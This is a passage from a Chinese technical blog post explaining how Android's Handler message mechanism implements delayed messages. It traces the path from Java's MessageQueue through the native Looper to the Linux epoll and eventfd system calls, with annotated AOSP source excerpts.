class=\"built_in\">reset</span>(<span class=\"built_in\">epoll_create1</span>(EPOLL_CLOEXEC));</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">struct</span> <span class=\"title class_\">epoll_event</span> eventItem;</span><br><span class=\"line\">    <span class=\"built_in\">memset</span>(&amp; eventItem, <span class=\"number\">0</span>, <span class=\"built_in\">sizeof</span>(epoll_event));</span><br><span class=\"line\">    eventItem.events = EPOLLIN; <span class=\"comment\">// IN，监听管道的输入（即write）操作</span></span><br><span class=\"line\">    <span class=\"comment\">// 唤醒事件fd要由event数据持有，等会儿唤醒时才能进行查找匹配</span></span><br><span class=\"line\">    eventItem.data.fd = mWakeEventFd.<span class=\"built_in\">get</span>();</span><br><span class=\"line\">    <span class=\"comment\">// 【重点】用epoll_ctl函数注册唤醒事件的监听，EPOLL_CTL_ADD表示添加事件的操作标志</span></span><br><span class=\"line\">    <span class=\"type\">int</span> result = <span class=\"built_in\">epoll_ctl</span>(mEpollFd.<span class=\"built_in\">get</span>(), EPOLL_CTL_ADD, mWakeEventFd.<span class=\"built_in\">get</span>(), &amp;eventItem);</span><br><span class=\"line\">    ...</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<p>此时我们再回过头去看Looper的 <code>pollInner</code> 函数，<code>epoll_create1</code> 、  <code>epoll_ctl</code>  、 <code>epoll_wait</code> 这三个epoll流程就这样联系了起来：</p>\n<figure class=\"highlight cpp\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"function\"><span class=\"type\">int</span> <span class=\"title\">Looper::pollInner</span><span class=\"params\">(<span class=\"type\">int</span> timeoutMillis)</span> </span>&#123;</span><br><span class=\"line\">    ...</span><br><span class=\"line\">    <span class=\"comment\">// 【重点】epoll_wait系统调用就是整个消息机制阻塞的真正位置，阻塞等待同时可以读取管道的通知</span></span><br><span class=\"line\">    <span class=\"type\">int</span> eventCount = <span class=\"built_in\">epoll_wait</span>(mEpollFd.<span class=\"built_in\">get</span>(), eventItems, EPOLL_MAX_EVENTS, timeoutMillis);</span><br><span class=\"line\">    ...</span><br><span class=\"line\">    <span class=\"comment\">// 返回eventCount大于0，说明timeout未到，就有新的事件写入管道导致提前唤醒</span></span><br><span class=\"line\">    <span class=\"keyword\">for</span> (<span class=\"type\">int</span> i = <span class=\"number\">0</span>; i &lt; eventCount; i++) &#123;</span><br><span class=\"line\">        <span class=\"type\">int</span> fd = eventItems[i].data.fd;</span><br><span class=\"line\">        <span class=\"type\">uint32_t</span> epollEvents = eventItems[i].events;</span><br><span class=\"line\">        <span class=\"keyword\">if</span> (fd == mWakeEventFd.<span class=\"built_in\">get</span>()) &#123; <span class=\"comment\">// 查找匹配唤醒事件</span></span><br><span class=\"line\">            <span class=\"keyword\">if</span> (epollEvents &amp; EPOLLIN) &#123;</span><br><span class=\"line\">                <span class=\"built_in\">awoken</span>(); <span class=\"comment\">// 【重点】被唤醒</span></span><br><span class=\"line\">            &#125; <span class=\"keyword\">else</span> &#123;</span><br><span class=\"line\">    ...</span><br><span class=\"line\">Done: ;</span><br><span class=\"line\">    ...</span><br><span class=\"line\">    <span class=\"keyword\">return</span> result;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\">            </span><br><span class=\"line\"><span class=\"function\"><span class=\"type\">void</span> <span class=\"title\">Looper::awoken</span><span class=\"params\">()</span> </span>&#123;</span><br><span class=\"line\">    <span class=\"type\">uint64_t</span> counter;</span><br><span class=\"line\">    <span class=\"comment\">// 进行读操作</span></span><br><span class=\"line\">    <span class=\"built_in\">TEMP_FAILURE_RETRY</span>(<span class=\"built_in\">read</span>(mWakeEventFd.<span class=\"built_in\">get</span>(), &amp;counter, <span class=\"built_in\">sizeof</span>(<span class=\"type\">uint64_t</span>)));</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<p>可见，<code>awoken</code> （被唤醒的意思）函数实际上就是一个管道的读操作，既然此时被epoll事件驱动唤醒起来读，那么肯定就是监听到对应的写操作导致的，显然，写操作就在 <code>wake</code> 函数中：</p>\n<figure class=\"highlight cpp\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"function\"><span class=\"type\">void</span> <span class=\"title\">Looper::wake</span><span class=\"params\">()</span> </span>&#123;</span><br><span class=\"line\">    <span class=\"type\">uint64_t</span> inc = <span class=\"number\">1</span>;</span><br><span class=\"line\">    <span class=\"comment\">// 往wake pipe里面写了一个1，触发了唤醒</span></span><br><span class=\"line\">    <span class=\"type\">ssize_t</span> nWrite = <span class=\"built_in\">TEMP_FAILURE_RETRY</span>(<span class=\"built_in\">write</span>(mWakeEventFd.<span class=\"built_in\">get</span>(), &amp;inc, <span class=\"built_in\">sizeof</span>(<span class=\"type\">uint64_t</span>)));</span><br><span class=\"line\">    ...</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<p>这里需要额外提醒一下，旧版本的源码是这样创建唤醒事件描述符的：</p>\n<figure class=\"highlight cpp\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"type\">int</span> wakeFds[<span class=\"number\">2</span>];</span><br><span class=\"line\"><span class=\"type\">int</span> result = <span class=\"built_in\">pipe</span>(wakeFds);</span><br><span class=\"line\">mWakeReadPipeFd = wakeFds[<span class=\"number\">0</span>];</span><br><span class=\"line\">mWakeWritePipeFd = wakeFds[<span class=\"number\">1</span>];</span><br></pre></td></tr></table></figure>\n\n<p>读和写是两个描述符，而最新的系统源码中只用了一个mWakeEventFd描述符，可能是考虑到Handler消息机制并不需要跨进程的缘故，具体还有待研究。</p>\n<p>上述的 <code>Looper::wake()</code> 函数源头其实就是是由MQ的 <code>nativeWake</code> 函数调用的：</p>\n<figure class=\"highlight cpp\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"function\"><span class=\"type\">static</span> <span class=\"type\">void</span> <span class=\"title\">android_os_MessageQueue_nativeWake</span><span class=\"params\">(JNIEnv* env, jclass clazz, jlong ptr)</span> </span>&#123;</span><br><span class=\"line\">    NativeMessageQueue* nativeMessageQueue = <span class=\"built_in\">reinterpret_cast</span>&lt;NativeMessageQueue*&gt;(ptr);</span><br><span class=\"line\">    nativeMessageQueue-&gt;<span class=\"built_in\">wake</span>(); <span class=\"comment\">// MQ内部会进一步调用Looper::wake()</span></span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<p>回想一下上文，<code>nativeWake(mPtr);</code> 在Java层就是由 <code>enqueueMessage</code> 方法调用的，即消息入队时。至此，我们终于贯通了整个流程，从Java层一直探索到了Linux内核的系统调用，喜大普奔啊！</p>\n<p>总结一下，回到标题，为什么说<strong>没有epoll就没有Handler</strong>。因为Handler + Looper + MessageQueue这一套消息机制之所以可以处理延时消息，且达到事件驱动的效果，还不占用CPU资源，究其本质就是Native层使用了Linux内核的epoll I&#x2F;O事件通知机制。满足了两个场景：</p>\n<ul>\n<li><p>当通过 <code>postDelayed</code> 发送延时消息后，传入的时间最终会通过 <code>nativePollOnce</code> 方法进行带超时的阻塞，本质上是因为 <code>epoll_wait</code> 函数的挂起，达到了延时的目的。</p>\n<p>时间到后阻塞结束，<code>epoll_wait</code> 返回，线程被重新唤醒并获得CPU资源，且epoll事件数（event_count）为0，说明中途没被唤醒，然后 <code>nativePollOnce</code> 直接返回，进而MQ的 <code>next</code> 方法再返回消息对象给上层Looper。</p>\n</li>\n<li><p>在MessageQueue的 <code>enqueueMessage</code> 方法中会判断新插入的消息的时间是否小于队头消息的时间，以决定要不要立即唤醒，即通过 <code>nativeWake</code> 方法打断超时未到的阻塞。</p>\n<p>若需唤醒，便会往wake pipe唤醒管道中写入数据（其实就是一个整数1），由于epoll监听了mWakeEventFd唤醒事件描述符，所以此时 <code>epoll_wait</code> 结束了挂起状态，返回事件数大于0，进而调用到 <code>awoken</code>，最后 <code>nativePollOnce</code> 返回result为POLL_WAKE，上层消息得以继续处理。因为我们知道Looper的loop是一直在循环调用next的，如果底层不醒，上层就会阻塞。</p>\n</li>\n</ul>\n<p>所以要么是timeout到了自动唤醒，要么是由于新消息插入导致主动唤醒。用不太严谨的流程图来描述一下主动唤醒的过程：</p>\n<p><img src=\"https://imgconvert.csdnimg.cn/20201119000301533.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3lzeTk1MDgwMw==,size_16,color_FFFFFF,t_70\"></p>\n<h2 id=\"后话\"><a href=\"#后话\" class=\"headerlink\" title=\"后话\"></a>后话</h2><p>在应用进程退到后台时，一般情况下就没有什么消息发送了，所以主线程便阻塞在queue.next()中的 <code>nativePollOnce</code> 方法里，并释放CPU资源进入休眠状态，并不会消耗大量CPU资源。即便在前台，只要你的UI没有动画绘制或者没有触摸交互，也是差不多的状态。这也回答了为什么Looper中在进行无限循环却不会导致异常耗电的问题。</p>\n<p>关于Linux系统调用为什么可以挂起且不占用CPU时间片，CPU的定时器和中断又是怎么实现的？那可能就涉及到硬件知识了，好好复习组成原理吧哈哈哈。后续有空我也会补充上来。</p>\n<p>其实研究到最后，我才悟出了为什么epoll要叫epoll，因为它和原来poll机制的最大区别就是改善成了event（事件）驱动，这个e如果我没猜错的话应该代表的就是event。</p>\n<h2 id=\"参考\"><a href=\"#参考\" class=\"headerlink\" title=\"参考\"></a>参考</h2><ul>\n<li><a href=\"https://my.oschina.net/u/3863980/blog/1933086\">Android中的Handler的Native层研究</a></li>\n<li><a href=\"http://c.biancheng.net/view/3066.html\">Linux 文件描述符到底是什么？</a></li>\n<li><a href=\"https://zhuanlan.zhihu.com/p/143430585\">理解Linux的文件描述符FD与Inode</a></li>\n<li><a href=\"https://juejin.im/post/6844904005202608136\">文件描述符fd（File Descriptor）简介</a></li>\n<li><a href=\"https://zhuanlan.zhihu.com/p/58489873\">Linux 的进程间通信：管道</a></li>\n<li><a href=\"https://www.jianshu.com/p/9c0c2b57cb73\">Linux管道命令（pipe）</a></li>\n<li><a href=\"https://www.cnblogs.com/lojunren/p/3856290.html\">Linux下的I&#x2F;O复用与epoll详解</a></li>\n<li><a href=\"https://blog.csdn.net/sunyurun/article/details/8194979\">异步阻塞IO —— epoll</a></li>\n<li><a href=\"https://www.jianshu.com/p/1cda21639f3e\">Handler 中的 epoll</a></li>\n</ul>\n","site":{"data":{"widget":{"top":[{"class_name":"donate","id_name":"donate","name":"随缘支持","icon":"fas fa-heartbeat","html":"<p style=\"text-align:center;padding:0;margin:0;\"><a href=\"https://qr.alipay.com/fkx12362diu95oh2aweaac5\"><img src=\"https://blog.ysy950803.top/img/love-support.png\" width=\"200\" height=\"200\"/></a></p> <p style=\"text-align:center;padding:0;margin:0;\">移动端点击二维码亦可</p> <p style=\"text-align:center;padding:0;margin:0;\"><u><a href=\"https://paypal.me/yaoshengyu\">Paypal.me if you like</a></u></p>"}]}}},"cover":false,"excerpt":"","more":"<blockquote>\n<p>Handler，英文释义：处理者，处理程序。他就是Android系统中的打工人，背负着传递消息的重任。很多人在第一次尝试去阅读framework源码时，可能也是从Handler消息机制开始的，我们会发现源码的很多地方都用到了Handler。然而，他好像并没有我们想象的那么简单，如果我们要深入探索的话，可以一直追溯到Linux内核。</p>\n</blockquote>\n<h2 id=\"预备\"><a href=\"#预备\" class=\"headerlink\" title=\"预备\"></a>预备</h2><p>本文分析源码均基于API 29，来源于官方AOSP：<a href=\"https://cs.android.com/android/platform/superproject/\">cs.android.com</a></p>\n<h2 id=\"问号\"><a href=\"#问号\" class=\"headerlink\" title=\"问号\"></a>问号</h2><p>Handler的API使用还是比较简单的，我们比较常用的就是通过类似如下方式来发送一个Runnable到Handler所在线程去执行：</p>\n<figure class=\"highlight java\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">new</span> <span class=\"title class_\">Handler</span>().post(() -&gt; &#123; <span class=\"comment\">/* do something */</span> &#125;);</span><br><span class=\"line\"><span class=\"keyword\">new</span> <span class=\"title class_\">Handler</span>().postDelayed(() -&gt; &#123; <span class=\"comment\">/* do something after 3s */</span> &#125;, <span class=\"number\">3000</span>);</span><br></pre></td></tr></table></figure>\n\n<p>这里为了简单直接用了匿名类，当然你也可以实现自定义的Handler并重写 <code>handleMessage</code> 方法来处理消息。<code>post</code> 最终其实还是调用到了Handler的  <code>sendMessageDelayed</code> 方法，将Runnable封装成一个Message发送到消息队列MessageQueue中，最后再由Looper循环将其取出，再交回Handler来处理。因此我们在子线程调用主线程的Handler来发送消息时，就达到了异步执行任务再将结果告知主线程的目的。</p>\n<p>好奇的同学就会有问号了，<strong>这个上面的delay延迟执行是如何实现的（今天的重点）？</strong>是定时器吗？还是周期性轮询？还是事件驱动？带着这些疑问，就不得不深入源码了。</p>\n<h2 id=\"Java层\"><a href=\"#Java层\" class=\"headerlink\" title=\"Java层\"></a>Java层</h2><p>废话不多说直接看Handler源码：</p>\n<figure class=\"highlight java\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">public</span> <span class=\"keyword\">final</span> <span class=\"type\">boolean</span> <span class=\"title function_\">sendMessageDelayed</span><span class=\"params\">(<span class=\"meta\">@NonNull</span> Message msg, <span class=\"type\">long</span> delayMillis)</span> &#123;</span><br><span class=\"line\">    <span class=\"keyword\">if</span> (delayMillis &lt; <span class=\"number\">0</span>) &#123;</span><br><span class=\"line\">        delayMillis = <span class=\"number\">0</span>;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    <span class=\"keyword\">return</span> sendMessageAtTime(msg, SystemClock.uptimeMillis() + delayMillis);</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">public</span> <span class=\"type\">boolean</span> <span class=\"title function_\">sendMessageAtTime</span><span class=\"params\">(<span class=\"meta\">@NonNull</span> Message msg, <span class=\"type\">long</span> uptimeMillis)</span> &#123;</span><br><span class=\"line\">    <span class=\"type\">MessageQueue</span> <span class=\"variable\">queue</span> <span class=\"operator\">=</span> mQueue;</span><br><span class=\"line\">    ...</span><br><span class=\"line\">    <span class=\"keyword\">return</span> enqueueMessage(queue, msg, uptimeMillis);</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<p>这里有个细节，最终调用的是 <code>sendMessageAtTime</code> 方法，且并没有直接把delay时长传进去，而是通过加当前时间得到一个确切时间作为参数传递的。这样做的原因：后续调用到系统底层时，若再需要这个delay，会用这个确切的uptime减去新的当前时间，保证精准，减少误差（因为从应用层调用到底层还是需要不少时间的）。</p>\n<p>Handler的 <code>enqueueMessage</code> 方法稍作处理后会调用到MessageQueue的同名方法，在分析之前我们大脑中先保留一个粗浅的概念以便于理解后面的源码，就是<strong>当消息队列为空或者队头的消息delay时间还没到时，相关代码阻塞（但线程释放CPU资源进入休眠状态），新的消息来时才可能唤醒</strong>，后面我们会剖析其原理。说回来，先看MessageQueue的 <code>enqueueMessage</code> ：</p>\n<figure class=\"highlight java\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"type\">boolean</span> <span class=\"title function_\">enqueueMessage</span><span class=\"params\">(Message msg, <span class=\"type\">long</span> when)</span> &#123; <span class=\"comment\">// when就是上面的uptimeMillis</span></span><br><span class=\"line\">    ...</span><br><span class=\"line\">    <span class=\"keyword\">synchronized</span> (<span class=\"built_in\">this</span>) &#123;</span><br><span class=\"line\">        ...</span><br><span class=\"line\">        msg.when = when; <span class=\"comment\">// 刚才得到的uptimeMillis赋值给msg消息对象了</span></span><br><span class=\"line\">        <span class=\"type\">Message</span> <span class=\"variable\">p</span> <span class=\"operator\">=</span> mMessages; <span class=\"comment\">// 为什么mMessages命名是复数，因为是一个链表结构，来存储消息队列</span></span><br><span class=\"line\">        <span class=\"type\">boolean</span> needWake; <span class=\"comment\">// 是否需要唤醒，为什么要唤醒？后面会讲到</span></span><br><span class=\"line\">        <span class=\"keyword\">if</span> (p == <span class=\"literal\">null</span> || when == <span class=\"number\">0</span> || when &lt; p.when) &#123;</span><br><span class=\"line\">            <span class=\"comment\">// 插入消息到队头，如果阻塞就唤醒</span></span><br><span class=\"line\">            msg.next = p;</span><br><span class=\"line\">            mMessages = msg;</span><br><span class=\"line\">            needWake = mBlocked;</span><br><span class=\"line\">        &#125; <span class=\"keyword\">else</span> &#123;</span><br><span class=\"line\">            <span class=\"comment\">// 下面这一堆（比如isAsynchronous）可以暂时不管，只用知道是在做新消息插入到链表的操作就可以了</span></span><br><span class=\"line\">            needWake = mBlocked &amp;&amp; p.target == <span class=\"literal\">null</span> &amp;&amp; msg.isAsynchronous();</span><br><span class=\"line\">            Message prev;</span><br><span class=\"line\">            <span class=\"keyword\">for</span> (;;) &#123;</span><br><span class=\"line\">                prev = p;</span><br><span class=\"line\">                p = p.next;</span><br><span class=\"line\">                <span class=\"comment\">// for循环结合这里的if条件，保证了消息是按when时间排序的</span></span><br><span class=\"line\">                <span class=\"keyword\">if</span> (p == <span class=\"literal\">null</span> || when &lt; p.when) &#123;</span><br><span class=\"line\">                    <span class=\"keyword\">break</span>;</span><br><span class=\"line\">                &#125;</span><br><span class=\"line\">                <span class=\"keyword\">if</span> (needWake &amp;&amp; p.isAsynchronous()) &#123;</span><br><span class=\"line\">                    needWake = <span class=\"literal\">false</span>;</span><br><span class=\"line\">                &#125;</span><br><span class=\"line\">            &#125;</span><br><span class=\"line\">            msg.next = p; <span class=\"comment\">// 经过上面的变换，这里的p实际上是prev原本的next节点</span></span><br><span class=\"line\">            prev.next = msg; <span class=\"comment\">// 再更新prev的next节点，msg正式插入消息队列</span></span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">        <span class=\"keyword\">if</span> (needWake) &#123;</span><br><span class=\"line\">            <span class=\"comment\">// 【重点】进行native方法调用唤醒，这里的mPtr其实是MessageQueue在native层对象的引用，后面会讲到</span></span><br><span class=\"line\">            nativeWake(mPtr);</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    <span class=\"keyword\">return</span> <span class=\"literal\">true</span>;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<p>这段代码比较简单，主要就是把新来的消息按delay时间排序入队，并在必要情况下进行唤醒操作。产生的疑问便是：</p>\n<ul>\n<li>这个唤醒是唤醒了个什么？为什么要进行native方法调用？</li>\n<li>传进来的when时间字段赋值给msg了，后续又如何利用的呢？</li>\n</ul>\n<p>带着这些问题，我们就要去找Looper了，因为它是整个消息机制流水线的发动机，其动力在 <code>loop</code> 方法：</p>\n<figure class=\"highlight java\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">public</span> <span class=\"keyword\">static</span> <span class=\"keyword\">void</span> <span class=\"title function_\">loop</span><span class=\"params\">()</span> &#123;</span><br><span class=\"line\">    <span class=\"keyword\">final</span> <span class=\"type\">Looper</span> <span class=\"variable\">me</span> <span class=\"operator\">=</span> myLooper(); <span class=\"comment\">// 一个线程对应一个Looper</span></span><br><span class=\"line\">    ...</span><br><span class=\"line\">    <span class=\"keyword\">final</span> <span class=\"type\">MessageQueue</span> <span class=\"variable\">queue</span> <span class=\"operator\">=</span> me.mQueue; <span class=\"comment\">// 每个Looper对应一个消息队列</span></span><br><span class=\"line\">    ...</span><br><span class=\"line\">    <span class=\"keyword\">for</span> (;;) &#123;</span><br><span class=\"line\">        <span class=\"type\">Message</span> <span class=\"variable\">msg</span> <span class=\"operator\">=</span> queue.next(); <span class=\"comment\">// might block（会阻塞）</span></span><br><span class=\"line\">        ...</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    ...</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<p>原来Looper这个家伙很懒啊，直接调用了queue的 <code>next</code> 方法，并没有单独去处理消息delay时间的问题。结果还是MessageQueue最累。当然，Looper本身的职责也不是这些，它做好消息的分发就行了。</p>\n<p>来看MQ的 <code>next</code> 方法，马上我们就要进入仙境了：</p>\n<figure class=\"highlight java\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">Message <span class=\"title function_\">next</span><span class=\"params\">()</span> &#123;</span><br><span class=\"line\">    <span class=\"keyword\">final</span> <span class=\"type\">long</span> <span class=\"variable\">ptr</span> <span class=\"operator\">=</span> mPtr; <span class=\"comment\">// 拿到MQ的native层引用</span></span><br><span class=\"line\">    ...</span><br><span class=\"line\">    <span class=\"type\">int</span> <span class=\"variable\">nextPollTimeoutMillis</span> <span class=\"operator\">=</span> <span class=\"number\">0</span>; <span class=\"comment\">// 下一次轮询的超时时间，这也是我们首次看到poll这个词汇</span></span><br><span class=\"line\">    <span class=\"keyword\">for</span> (;;) &#123;</span><br><span class=\"line\">        ...</span><br><span class=\"line\">        <span class=\"comment\">// 【重点】又是一个native方法，它会进行阻塞，这就是为什么消息可以延迟的初步原因</span></span><br><span class=\"line\">        nativePollOnce(ptr, nextPollTimeoutMillis);</span><br><span class=\"line\"></span><br><span class=\"line\">        <span class=\"keyword\">synchronized</span> (<span class=\"built_in\">this</span>) &#123;</span><br><span class=\"line\">            <span class=\"comment\">// 阻塞结束，开始获取并返回msg对象给Looper</span></span><br><span class=\"line\">            <span class=\"keyword\">final</span> <span class=\"type\">long</span> <span class=\"variable\">now</span> <span class=\"operator\">=</span> SystemClock.uptimeMillis();</span><br><span class=\"line\">            <span class=\"type\">Message</span> <span class=\"variable\">prevMsg</span> <span class=\"operator\">=</span> <span class=\"literal\">null</span>;</span><br><span class=\"line\">            <span class=\"type\">Message</span> <span class=\"variable\">msg</span> <span class=\"operator\">=</span> mMessages;</span><br><span class=\"line\">            <span class=\"keyword\">if</span> (msg != <span class=\"literal\">null</span> &amp;&amp; msg.target == <span class=\"literal\">null</span>) &#123;</span><br><span class=\"line\">                ...</span><br><span class=\"line\">            &#125;</span><br><span class=\"line\">            <span class=\"keyword\">if</span> (msg != <span class=\"literal\">null</span>) &#123;</span><br><span class=\"line\">                <span class=\"keyword\">if</span> (now &lt; msg.when) &#123;</span><br><span class=\"line\">                    <span class=\"comment\">// 下一个消息时间未到，更新这个阻塞超时时间，for循环下一次便会利用到此时间</span></span><br><span class=\"line\">                    <span class=\"comment\">// 这里就做了一次when - now的操作，回应我上文所述</span></span><br><span class=\"line\">                    nextPollTimeoutMillis = (<span class=\"type\">int</span>) Math.min(msg.when - now, Integer.MAX_VALUE);</span><br><span class=\"line\">                &#125; <span class=\"keyword\">else</span> &#123;</span><br><span class=\"line\">                    <span class=\"comment\">// Got a message.</span></span><br><span class=\"line\">                    mBlocked = <span class=\"literal\">false</span>;</span><br><span class=\"line\">                    <span class=\"keyword\">if</span> (prevMsg != <span class=\"literal\">null</span>) &#123;</span><br><span class=\"line\">                        prevMsg.next = msg.next;</span><br><span class=\"line\">                    &#125; <span class=\"keyword\">else</span> &#123;</span><br><span class=\"line\">                        mMessages = msg.next;</span><br><span class=\"line\">                    &#125;</span><br><span class=\"line\">                    msg.next = <span class=\"literal\">null</span>;</span><br><span class=\"line\">                    ...</span><br><span class=\"line\">                    <span class=\"keyword\">return</span> msg;</span><br><span class=\"line\">                &#125;</span><br><span class=\"line\">            &#125; <span class=\"keyword\">else</span> &#123;</span><br><span class=\"line\">                <span class=\"comment\">// No more messages.</span></span><br><span class=\"line\">                nextPollTimeoutMillis = -<span class=\"number\">1</span>;</span><br><span class=\"line\">            &#125;</span><br><span class=\"line\">            ...</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">        ...</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<p>从上述可见，我们一开始传进来的delay延时，经过一路波折，来到了 <code>nativePollOnce(ptr, nextPollTimeoutMillis)</code> 本地方法，此方法是阻塞调用，再结合前面的 <code>nativeWake(ptr)</code> 方法，我们可以对消息机制的延时原理有一个初步认知：</p>\n<ul>\n<li>当通过 <code>postDelayed</code> 发送延时消息后，传入的时间最终会通过 <code>nativePollOnce</code> 方法进行带超时的阻塞，以达到延时的目的，时间到后阻塞结束，<code>next</code> 方法再返回消息对象给Looper。</li>\n<li>在MessageQueue的 <code>enqueueMessage</code> 方法中会判断新插入的消息的时间是否小于队头消息的时间，以决定要不要立即唤醒，即通过 <code>nativeWake</code> 方法打断超时未到的阻塞。</li>\n</ul>\n<p>Java层分析到此其实差不多了，但是好奇的同学自然又会思考这个阻塞不会一直占用CPU资源吗？难道这就是Android耗电的真凶！？如果这么想的话，那你还是低估了Linux。为了进一步搞清楚这个Native阻塞，我们就要深入到Android系统的Native源码了。</p>\n<h2 id=\"Native层\"><a href=\"#Native层\" class=\"headerlink\" title=\"Native层\"></a>Native层</h2><p>按照源码的规范，我们可以直接找到MessageQueue的cpp代码：<a href=\"https://cs.android.com/android/platform/superproject/+/master:frameworks/base/core/jni/android_os_MessageQueue.cpp;l=188;drc=master;bpv=0;bpt=1\">frameworks&#x2F;base&#x2F;core&#x2F;jni&#x2F;android_os_MessageQueue.cpp</a> 中的 <code>nativePollOnce</code> 函数：</p>\n<figure class=\"highlight cpp\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br></pre></td><td 